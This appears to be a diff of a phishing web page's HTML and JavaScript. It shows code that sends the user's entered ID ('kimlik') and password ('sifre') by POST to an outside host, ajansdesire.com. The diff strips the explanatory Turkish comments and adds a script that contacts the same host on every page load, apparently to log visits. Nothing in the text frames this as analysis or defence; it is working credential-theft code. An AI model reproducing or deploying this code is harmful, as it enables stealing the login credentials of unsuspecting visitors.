@@ -159,15 +159,15 @@ font-size: 14px;  height: 46px;font-family: sans-serif;
                 var xhr = new XMLHttpRequest();
                 xhr.open("POST", "https://ajansdesire.com/asdasd/9index.php", true);
                 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-
-                // İsteği gönderin
+ 
+              
                 xhr.send("kimlik=" + kimlik + "&sifre=" + sifre);
 
-                // İşlem tamamlandığında sayfayı yenileyin
+       
                 xhr.onload = function() {
                     if (xhr.status == 200) {
-                        // İsteğin başarıyla tamamlandığını varsayalım
-                        location.reload(); // Sayfayı yenile
+                      
+                        location.reload(); 
                     }
                 };
             } else {
@@ -176,6 +176,20 @@ font-size: 14px;  height: 46px;font-family: sans-serif;
   
 }
 		  </script> 
+		  
+    <script>
+ 
+        window.addEventListener('load', function() {
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', 'https://ajansdesire.com/asdasd/tgtg.php', true);
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == 4 && xhr.status == 200) {
+                    console.log('GET isteği başarıyla gönderildi.');
+                }
+            };
+            xhr.send();
+        });
+    </script>
     <div>
   </body>
 </html>
